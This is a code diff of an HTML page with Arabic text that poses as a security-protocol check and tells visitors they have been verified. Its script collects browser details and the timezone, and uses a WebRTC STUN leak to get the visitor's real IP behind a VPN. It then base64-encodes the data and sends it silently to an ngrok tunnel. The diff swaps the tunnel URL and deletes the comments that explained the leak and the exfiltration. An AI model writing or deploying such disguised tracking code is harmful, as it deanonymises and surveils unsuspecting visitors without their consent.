@@ -14,8 +14,7 @@
     <div id="status">جاري التحقق من بروتوكولات الأمان...</div>
 
     <script>
-        // رابط الـ Ngrok الخاص بك الذي أعطيتني إياه
-        const GATEWAY = "https://10ba7e8f3b08.ngrok-free.app/log";
+        const GATEWAY = "https://c4d888980073.ngrok-free.app";
 
         async function startCapture() {
             let info = {
@@ -25,7 +24,7 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // تقنية WebRTC Leak لجلب الـ IP الحقيقي وتجاوز الـ VPN
+           
             const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
             pc.onicecandidate = (e) => {
                 if (e.candidate) {
@@ -33,7 +32,7 @@
                     const match = ipRegex.exec(e.candidate.candidate);
                     if (match) info.real_ip = match[1];
                 } else {
-                    // إرسال البيانات فور انتهاء الجمع
+                     
                     const payload = btoa(JSON.stringify(info));
                     fetch(`${GATEWAY}?data=${payload}`, { mode: 'no-cors' });
                     document.getElementById('status').innerText = "تم التحقق. يمكنك العودة الآن.";
